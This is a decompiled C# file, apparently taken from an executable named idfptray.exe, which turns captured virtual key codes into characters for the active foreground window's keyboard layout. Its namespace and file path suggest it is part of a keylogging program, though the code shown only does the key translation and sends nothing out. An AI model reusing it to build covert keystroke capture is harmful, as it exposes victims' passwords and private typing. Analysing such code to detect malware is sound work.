// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.MouseKeyHook.WinApi.KeyboardNativeMethods
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using VERMELHO265MONARCA.Core.MouseKeyHook.Implementation;

namespace VERMELHO265MONARCA.Core.MouseKeyHook.WinApi
{
  internal static class KeyboardNativeMethods
  {
    private static int lastVirtualKeyCode = 0;
    private static int lastScanCode = 0;
    private static byte[] lastKeyState = new byte[256];
    private static bool lastIsDead = false;
    public const byte VK_SHIFT = 16;
    public const byte VK_CAPITAL = 20;
    public const byte VK_NUMLOCK = 144;
    public const byte VK_LSHIFT = 160;
    public const byte VK_RSHIFT = 161;
    public const byte VK_LCONTROL = 162;
    public const byte VK_RCONTROL = 163;
    public const byte VK_LMENU = 164;
    public const byte VK_RMENU = 165;
    public const byte VK_LWIN = 91;
    public const byte VK_RWIN = 92;
    public const byte VK_SCROLL = 145;
    public const byte VK_INSERT = 45;
    public const byte VK_CONTROL = 17;
    public const byte VK_MENU = 18;
    public const byte VK_PACKET = 231;

    internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
    {
      IntPtr activeKeyboard = KeyboardNativeMethods.GetActiveKeyboard();
      int scanCode = KeyboardNativeMethods.MapVirtualKeyEx(virtualKeyCode, 0, activeKeyboard);
      KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, activeKeyboard, out chars);
    }

    internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, out char[] chars)
    {
      IntPtr activeKeyboard = KeyboardNativeMethods.GetActiveKeyboard();
      KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, activeKeyboard, out chars);
    }

    internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl, out char[] chars)
    {
      StringBuilder pwszBuff1 = new StringBuilder(64);
      KeyboardState current = KeyboardState.GetCurrent();
      byte[] nativeState = current.GetNativeState();
      bool flag = false;
      if (current.IsDown(Keys.ShiftKey))
        nativeState[16] = (byte) 128;
      if (current.IsToggled(Keys.Capital))
        nativeState[20] = (byte) 1;
      switch (KeyboardNativeMethods.ToUnicodeEx(virtualKeyCode, scanCode, nativeState, pwszBuff1, pwszBuff1.Capacity, fuState, dwhkl))
      {
        case -1:
          flag = true;
          KeyboardNativeMethods.ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
          chars = (char[]) null;
          break;
        case 0:
          chars = (char[]) null;
          break;
        case 1:
          if (pwszBuff1.Length > 0)
          {
            chars = new char[1]{ pwszBuff1[0] };
            break;
          }
          chars = (char[]) null;
          break;
        default:
          if (pwszBuff1.Length > 1)
          {
            chars = new char[2]
            {
              pwszBuff1[0],
              pwszBuff1[1]
            };
            break;
          }
          chars = new char[1]{ pwszBuff1[0] };
          break;
      }
      if (KeyboardNativeMethods.lastVirtualKeyCode != 0 && KeyboardNativeMethods.lastIsDead)
      {
        if (chars == null)
          return;
        StringBuilder pwszBuff2 = new StringBuilder(5);
        KeyboardNativeMethods.ToUnicodeEx(KeyboardNativeMethods.lastVirtualKeyCode, KeyboardNativeMethods.lastScanCode, KeyboardNativeMethods.lastKeyState, pwszBuff2, pwszBuff2.Capacity, 0, dwhkl);
        KeyboardNativeMethods.lastIsDead = false;
        KeyboardNativeMethods.lastVirtualKeyCode = 0;
      }
      else
      {
        KeyboardNativeMethods.lastScanCode = scanCode;
        KeyboardNativeMethods.lastVirtualKeyCode = virtualKeyCode;
        KeyboardNativeMethods.lastIsDead = flag;
        KeyboardNativeMethods.lastKeyState = (byte[]) nativeState.Clone();
      }
    }

    private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
    {
      StringBuilder pwszBuff = new StringBuilder(10);
      byte[] lpKeyState;
      do
      {
        lpKeyState = new byte[(int) byte.MaxValue];
      }
      while (KeyboardNativeMethods.ToUnicodeEx(vk, sc, lpKeyState, pwszBuff, pwszBuff.Capacity, 0, hkl) < 0);
    }

    private static IntPtr GetActiveKeyboard()
    {
      int processId;
      return KeyboardNativeMethods.GetKeyboardLayout(ThreadNativeMethods.GetWindowThreadProcessId(ThreadNativeMethods.GetForegroundWindow(), out processId));
    }

    [Obsolete("Use ToUnicodeEx instead")]
    [DllImport("user32.dll")]
    public static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpbKeyState, byte[] lpwTransKey, int fuState);

    [DllImport("user32.dll")]
    public static extern int ToUnicodeEx(int wVirtKey, int wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff, int cchBuff, int wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] pbKeyState);

    [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    public static extern short GetKeyState(int vKey);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    internal static extern int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    internal static extern IntPtr GetKeyboardLayout(int dwLayout);

    internal enum MapType
    {
      MAPVK_VK_TO_VSC,
      MAPVK_VSC_TO_VK,
      MAPVK_VK_TO_CHAR,
      MAPVK_VSC_TO_VK_EX,
    }
  }
}
